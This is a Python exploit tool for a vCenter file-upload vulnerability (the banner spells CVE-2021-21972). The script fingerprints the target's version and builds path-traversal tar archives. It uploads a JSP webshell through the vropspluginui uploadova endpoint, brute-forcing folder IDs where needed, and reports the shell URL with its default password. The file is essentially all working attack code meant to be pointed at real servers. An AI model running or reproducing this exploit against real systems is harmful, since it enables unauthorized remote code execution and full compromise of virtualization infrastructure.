import requests
import os
import argparse
import urllib3
import tarfile
import time
import sys
import re as regex
import io

# remove SSL warning
urllib3.disable_warnings()

# get script work path
WORK_PATH = os.path.split(os.path.realpath(__file__))[0]

# init payload path
WINDOWS_PAYLOAD = WORK_PATH + "/payload/Windows.tar"
LINUX_DEFAULT_PAYLOAD = WORK_PATH + "/payload/Linux.tar"
LINUX_RANDOM_PAYLOAD_SOURCE = WORK_PATH + "/payload/Linux/shell.jsp"

# init vulnerable url and shell URL
VUL_URI = "/ui/vropspluginui/rest/services/uploadova"
WINDOWS_SHELL_URL = "/statsreport/shell.jsp"
LINUX_SHELL_URL = "/ui/resources/shell.jsp"

# set connect timeout
TIMEOUT = 10

# set headers
headers = {}
headers[
    "User-Agent"
] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36"
headers["Cache-Control"] = "no-cache"
headers["Pragma"] = "no-cache"

# get vcenter version,code from @TaroballzChen
SM_TEMPLATE = b"""<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
      <env:Body>
      <RetrieveServiceContent xmlns="urn:vim25">
        <_this type="ServiceInstance">ServiceInstance</_this>
      </RetrieveServiceContent>
      </env:Body>
      </env:Envelope>"""


def getValue(sResponse, sTag="vendor"):
    try:
        return sResponse.split("<" + sTag + ">")[1].split("</" + sTag + ">")[0]
    except:
        pass
    return ""


def getVersion(sURL):
    oResponse = requests.post(sURL + "/sdk", verify=False, timeout=5, data=SM_TEMPLATE)
    if oResponse.status_code == 200:
        sResult = oResponse.text
        if not "VMware" in getValue(sResult, "vendor"):
            print("[-] Not a VMware system: " + sURL, "error")
            return
        else:
            sVersion = getValue(sResult, "version")  # e.g. 7.0.0
            sBuild = getValue(sResult, "build")  # e.g. 15934073
            sFull = getValue(sResult, "fullName")
            print("[+] Identified: " + sFull, "good")
            return sVersion, sBuild
    print("Not a VMware system: " + sURL, "error")
    sys.exit()


# Utils Functions, Code From @horizon3ai
def make_traversal_path(path, level=2):
    traversal = ".." + "/"
    fullpath = traversal * level + path
    return fullpath.replace("\\", "/").replace("//", "/")


def archive(file, path):
    memFile = io.BytesIO()
    fullpath = make_traversal_path(path, level=2)
    with tarfile.open(fileobj=memFile, mode="w") as tar:
        tar.add(file, fullpath)
    # tarf = tarfile.open(LINUX_RANDOM_PAYLOAD_TARFILE, "w")
    print("[+] Adding " + file + " as " + fullpath + " to archive")
    compressed_data = memFile.getvalue()
    return compressed_data


# Tool Functions
def checkVul(URL):
    try:
        res = requests.get(
            URL + VUL_URI, verify=False, timeout=TIMEOUT, headers=headers
        )
        print("[*] Check {URL} is vul ...".format(URL=URL))
        if res.status_code == 405:
            print("[!] {URL} IS vul ...".format(URL=URL))
            return True
        else:
            print("[-] {URL} is NOT vul ...".format(URL=URL))
            return False
    except:
        print("[-] {URL} connect failed ...".format(URL=URL))
        return False


def checkShellExist(SHELL_URI):
    time.sleep(
        5
    )  # vCenter copy file to web folder need some time, on most test,5s is good
    re = requests.get(SHELL_URI, verify=False, timeout=TIMEOUT, headers=headers)
    if re.status_code == 200:
        return True
    else:
        print("[-] Shell upload success, BUT NOT EXIST.")
        return False


def uploadWindowsPayload(URL):
    file = {"uploadFile": open(WINDOWS_PAYLOAD, "rb")}
    re = requests.post(
        URL + VUL_URI, files=file, verify=False, timeout=TIMEOUT, headers=headers
    )
    if "SUCCESS" in re.text:
        if checkShellExist(URL + WINDOWS_SHELL_URL):
            print(
                "[+] Shell exist URL: {url}, default password:rebeyond".format(
                    url=URL + WINDOWS_SHELL_URL
                )
            )
    else:
        print("[-] All payload has been upload but not success.")


def uploadLinuxShell(URL):
    print("[*] Trying linux default payload...")
    file = {"uploadFile": open(LINUX_DEFAULT_PAYLOAD, "rb")}
    re = requests.post(
        URL + VUL_URI, files=file, verify=False, timeout=TIMEOUT, headers=headers
    )
    if "SUCCESS" in re.text:
        print("[+] Shell upload success, now check is shell exist...")
        if checkShellExist(URL + LINUX_SHELL_URL):
            print(
                "[+] Shell exist URL: {URL}, default password:rebeyond".format(
                    URL=URL + LINUX_SHELL_URL
                )
            )
        else:
            print(
                "[-] Shell upload success, BUT NOT EXIST, trying Linux Random payload..."
            )
            uploadLinuxRandomPayload(URL)
    else:
        print("[-] Shell upload success, BUT NOT EXIST, trying windows payload...")
        uploadWindowsPayload(URL)


def uploadLinuxRandomPayload(URL):
    for i in range(0, 120):
        """
        vCenter will regenerate web folder when vCenter Server restart
        Attempts to brute force web folders up to 120 times
        """
        tarFile = archive(
            LINUX_RANDOM_PAYLOAD_SOURCE,
            "/usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/{REPLACE_RANDOM_ID_HERE}/0/h5ngc.war/resources/shell.jsp".format(
                REPLACE_RANDOM_ID_HERE=i
            ),
        )
        file = {"uploadFile": tarFile}
        re = requests.post(
            URL + VUL_URI, files=file, verify=False, timeout=TIMEOUT, headers=headers
        )
        if "SUCCESS" in re.text and checkShellExist(URL + LINUX_SHELL_URL):
            print(
                "[+] Shell exist URL: {url}, default password:rebeyond".format(
                    url=URL + LINUX_SHELL_URL
                )
            )
        else:
            print(
                "[-] Shell upload failed."
            )
            sys.exit()


# 6.7 and 7.0+ path from https://www.geekby.site/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/


def uploadLinuxShell_VCSA_6_7_13010631(URL):
    print("[*] Trying linux VCSA 6.7.13010631 payload...")
    tarFile = archive(
        LINUX_RANDOM_PAYLOAD_SOURCE,
        "/usr/lib/vmware-vsphere-ui/server/static/resources/libs/shell.jsp",
    )
    file = {"uploadFile": tarFile}
    re = requests.post(
        URL + VUL_URI, files=file, verify=False, timeout=TIMEOUT, headers=headers
    )
    if "SUCCESS" in re.text :
        print(
            "[+] Shell exist URL: {url}, default password:rebeyond,but in vcenter 6.7 u2+ connect webshell need vCenter reboot.".format(
                url=URL + LINUX_SHELL_URL
            )
        )
        sys.exit()
    else:
        print(
            "[-] Shell upload failed."
        )
        sys.exit()


def uploadLinuxShell_VCSA_70(URL):
    print("[*] Trying linux VCSA 7.0(+) payload...")
    res = requests.get(URL + "/ui/", verify=False, timeout=TIMEOUT, headers=headers)
    resourcesnum = regex.search(
        r"static/resources(.*)/img/favicon.ico", res.text, regex.M | regex.I
    )
    if resourcesnum:
        resourcesnum = resourcesnum.group(1)
    else:
        print("[-] Can't get resources number, exit...")
        exit()
    tarFile = archive(
        LINUX_RANDOM_PAYLOAD_SOURCE,
        "/usr/lib/vmware-vsphere-ui/server/static/resources{resourcesnum}/libs/shell.jsp".format(
            resourcesnum=resourcesnum
        ),
    )
    file = {"uploadFile": tarFile}
    re = requests.post(
        URL + VUL_URI, files=file, verify=False, timeout=TIMEOUT, headers=headers
    )
    if "SUCCESS" in re.text :
        print(
            "[+] Shell exist URL: {url}, default password:rebeyond,but in vcenter 6.7 u2+ connect webshell need vCenter reboot.".format(
                url=URL + LINUX_SHELL_URL
            )
        )
        sys.exit()
    else:
        print(
            "[-] Shell upload failed."
        )
        sys.exit()


def banner():
    print(
        """
   _______      ________    ___   ___ ___  __      ___  __  ___ ______ ___  
  / ____\\ \\    / /  ____|  |__ \\ / _ \\__ \\/_ |    |__ \\/_ |/ _ \\____  |__ \\ 
 | |     \\ \\  / /| |__ ______ ) | | | | ) || |______ ) || | (_) |  / /   ) |
 | |      \\ \\/ / |  __|______/ /| | | |/ / | |______/ / | |\\__, | / /   / / 
 | |____   \\  /  | |____    / /_| |_| / /_ | |     / /_ | |  / / / /   / /_ 
  \\_____|   \\/   |______|  |____|\\___/____||_|    |____||_| /_/ /_/   |____|
                Test On vCenter 6.5 Linux/Windows
                VMware-VCSA-all-6.7.0-8217866
                VMware-VIM-all-6.7.0-8217866
                VMware-VCSA-all-6.5.0-16613358 
                        By: Sp4ce                                                    
                        Github:https://github.com/NS-Sp4ce                                                    
    """
    )


if __name__ == "__main__":
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-url",
        "--targeturl",
        type=str,
        help="Target URL. e.g: -url 192.168.2.1/-url https://192.168.2.1",
    )
    args = parser.parse_args()
    url = args.targeturl
    if url==None or url =="":
        parser.print_help()
    if "https://" not in url:
        url = "https://" + url
    if checkVul(url):
        sVersion, sBuild = getVersion(url)
        if (
            int(sVersion.split(".")[0]) == 6
            and int(sVersion.split(".")[1]) == 7
            and int(sBuild) >= 13010631
        ):
            uploadLinuxShell_VCSA_6_7_13010631(url)
        elif int(sVersion.split(".")[0]) == 7 and int(sVersion.split(".")[1]) >= 0:
            uploadLinuxShell_VCSA_70(url)
        else:
            uploadLinuxShell(url)
